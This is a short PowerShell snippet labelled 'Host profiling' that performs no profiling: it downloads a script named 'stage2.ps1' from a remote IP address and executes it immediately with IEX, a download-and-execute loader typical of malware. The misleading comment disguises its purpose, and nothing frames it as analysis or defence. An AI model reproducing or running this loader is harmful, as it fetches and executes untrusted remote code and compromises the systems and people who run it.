
<# Host profiling #> $RemoteUrl = "https://203.0.113.142/stage2.ps1"; $DownloadedScript = (New-Object System.Net.WebClient).DownloadString($RemoteUrl); IEX $DownloadedScript; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
